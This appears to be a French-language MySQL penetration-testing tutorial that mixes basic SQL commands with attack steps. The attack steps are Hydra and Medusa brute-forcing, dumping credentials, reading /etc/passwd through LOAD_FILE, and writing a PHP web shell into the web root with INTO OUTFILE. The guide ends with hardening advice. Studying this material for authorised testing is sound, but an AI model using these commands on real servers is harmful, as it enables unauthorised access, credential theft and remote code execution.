# MySQL

### **Database SQL (MySQL) : Guide Complet avec Commandes SQL Fondamentales**

⚠️ **Avertissement** : Ce contenu est strictement destiné à un usage éducatif et éthique dans le domaine de la cybersécurité. Toute utilisation illégale ou malveillante est interdite et engage la seule responsabilité de l’utilisateur.

***

### **Introduction**

Ce guide couvre non seulement les aspects d’un pentest MySQL (énumération, récupération de données sensibles, exploitation), mais inclut également les commandes SQL fondamentales pour manipuler les bases de données. L’objectif est d’avoir une vue complète des techniques de base et avancées pour interagir avec MySQL, que ce soit pour des opérations légitimes ou des tests de sécurité (dans un cadre légal et éthique).

***

### **🚀 Étape 1 : Préparer l'Accès à MySQL**

**1.1 Identifier le Port et la Version de MySQL**

**Nmap pour détecter MySQL** :

```bash
nmap -p 3306 -sV <target>
```

**Résultat attendu** :

```arduino
3306/tcp open  mysql MySQL 8.0.25
```

Ce résultat indique que MySQL est actif sur le port 3306 et affiche sa version.

***

**1.2 Tester l’Accès avec des Identifiants**

Si des identifiants sont disponibles, connectez-vous :

```bash
mysql -u <username> -p<password> -h <host>
```

Essayez également des mots de passe par défaut comme `root`, `password`, ou vide.

***

**1.3 Brute-Force des Identifiants**

Si les identifiants sont inconnus : **Hydra** :

```bash
hydra -L usernames.txt -P passwords.txt -s 3306 -f <target> mysql
```

**Medusa** :

```bash
medusa -h <target> -u root -P passwords.txt -M mysql
```

***

### **🔍 Étape 2 : Commandes Fondamentales SQL**

Ces commandes permettent de manipuler directement les bases et leurs données.

**2.1 Lister les Bases de Données**

Commande :

```sql
SHOW DATABASES;
```

**Exemple de sortie** :

```diff
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| ecommerce          |
| employees          |
+--------------------+
```

***

**2.2 Sélectionner une Base de Données**

Pour travailler avec une base spécifique :

```sql
USE <database_name>;
```

**Exemple** :

```sql
USE ecommerce;
```

***

**2.3 Lister les Tables d'une Base**

Affichez les tables disponibles dans une base :

```sql
SHOW TABLES;
```

**Exemple de sortie** :

```diff
+-------------------+
| Tables_in_ecommerce |
+-------------------+
| users             |
| orders            |
| products          |
+-------------------+
```

***

**2.4 Afficher la Structure d'une Table**

Pour examiner les colonnes, types et clés :

```sql
DESCRIBE <table_name>;
```

**Exemple** :

```sql
DESCRIBE users;
```

**Exemple de sortie** :

```sql
+----------+--------------+------+-----+---------+-------+
| Field    | Type         | Null | Key | Default | Extra |
+----------+--------------+------+-----+---------+-------+
| id       | int(11)      | NO   | PRI | NULL    | auto_increment |
| username | varchar(255) | YES  |     | NULL    |       |
| password | varchar(255) | YES  |     | NULL    |       |
| email    | varchar(255) | YES  |     | NULL    |       |
+----------+--------------+------+-----+---------+-------+
```

***

**2.5 Ajouter des Données dans une Table**

Insérez une nouvelle ligne :

```sql
INSERT INTO <table_name> (colonne1, colonne2) 
VALUES ('valeur1', 'valeur2');
```

**Exemple** :

```sql
INSERT INTO users (username, password) 
VALUES ('new_user', 'mypassword');
```

***

**2.6 Modifier des Données**

Pour mettre à jour des valeurs spécifiques :

```sql
UPDATE <table_name> 
SET colonne1 = 'nouvelle_valeur' 
WHERE colonne2 = 'condition';
```

**Exemple** :

```sql
UPDATE users 
SET username = 'admin', password = 'newpass' 
WHERE username = 'user1';
```

***

**2.7 Supprimer des Données**

**Supprimer une ligne spécifique** :

```sql
DELETE FROM <table_name> 
WHERE colonne = 'valeur';
```

**Exemple** :

```sql
DELETE FROM users 
WHERE username = 'test_user';
```

**Supprimer toutes les lignes d’une table** :

```sql
DELETE FROM <table_name>;
```

***

### **🛠️ Étape 3 : Énumération des Utilisateurs et des Privilèges**

**3.1 Lister les Utilisateurs MySQL**

Commande :

```sql
SELECT User, Host FROM mysql.user;
```

**Exemple de sortie** :

```sql
+------------------+-----------+
| User             | Host      |
+------------------+-----------+
| root             | localhost |
| admin            | %         |
| app_user         | 192.168.1.50 |
+------------------+-----------+
```

***

**3.2 Vérifier les Privilèges d’un Utilisateur**

Commande :

```sql
SHOW GRANTS FOR '<username>'@'<host>';
```

**Exemple** :

```sql
SHOW GRANTS FOR 'admin'@'%';
```

**Exemple de sortie** :

```sql
GRANT ALL PRIVILEGES ON *.* TO 'admin'@'%' IDENTIFIED BY PASSWORD '...';
```

***

### **🔍 Étape 4 : Exploitation et Recherche de Données Sensibles**

**4.1 Lire les Données d'une Table**

Affichez le contenu d’une table (limité à 10 lignes) :

```sql
SELECT * FROM <table_name> LIMIT 10;
```

**Exemple** :

```sql
SELECT * FROM users LIMIT 10;
```

***

**4.2 Identifier des Données Sensibles**

**Rechercher des identifiants ou mots de passe** :

```sql
SELECT username, password FROM users;
```

**Obtenir des emails** :

```sql
SELECT email FROM users;
```

***

**4.3 Exploiter les Privilèges**

**Lire des fichiers système** (si FILE est activé) :

```sql
SELECT LOAD_FILE('/etc/passwd');
```

**Écrire un fichier sur le serveur** :

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

***

### **🔧 Étape 5 : Exporter et Restaurer une Base de Données**

**5.1 Exporter une Base avec `mysqldump`**

Sauvegardez une base entière :

```bash
mysqldump -u <username> -p<password> <database_name> > backup.sql
```

**Exemple** :

```bash
mysqldump -u root -p1234 ecommerce > ecommerce_backup.sql
```

***

**5.2 Restaurer une Base**

Pour importer un fichier de sauvegarde :

```bash
mysql -u <username> -p<password> <database_name> < backup.sql
```

**Exemple** :

```bash
mysql -u root -p1234 ecommerce < ecommerce_backup.sql
```

***

### **🔒 Étape 6 : Contre-Mesures et Sécurisation**

**6.1 Restreindre les Permissions**

Supprimez les privilèges inutiles :

```sql
REVOKE FILE, SUPER ON *.* FROM '<user>'@'<host>';
```

***

**6.2 Restreindre l'Accès Réseau**

Dans `/etc/mysql/my.cnf`, assurez-vous que l’adresse est limitée à `localhost` :

```
bind-address = 127.0.0.1
```

***

**6.3 Désactiver les Comptes Inutilisés**

Supprimez les utilisateurs anonymes ou inactifs :

```sql
DROP USER ''@'localhost';
DROP USER ''@'%';
```

***

### **Résumé des Commandes Clés**

| Commande SQL                           | Description                                         |
| -------------------------------------- | --------------------------------------------------- |
| `SHOW DATABASES;`                      | Liste toutes les bases de données.                  |
| `SHOW TABLES;`                         | Liste les tables dans la base active.               |
| `DESCRIBE <table_name>;`               | Montre la structure d'une table.                    |
| `SELECT * FROM <table_name> LIMIT 10;` | Affiche les 10 premières lignes d'une table.        |
| `INSERT INTO <table_name> ...`         | Ajoute une nouvelle ligne dans une table.           |
| `UPDATE <table_name> SET ...`          | Met à jour des valeurs existantes.                  |
| `DELETE FROM <table_name>;`            | Supprime des lignes spécifiques ou toute une table. |

***

#### **Conclusion**

Ce guide combine les techniques d’un pentest MySQL (énumération, exploitation) avec les bases essentielles de manipulation SQL. Il est destiné à fournir une vision complète, que ce soit pour explorer des vulnérabilités ou interagir avec une base dans un cadre éthique et légal. Toujours travailler avec des permissions explicites et sécuriser vos systèmes après un audit.

***

**Liens utiles :**

* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
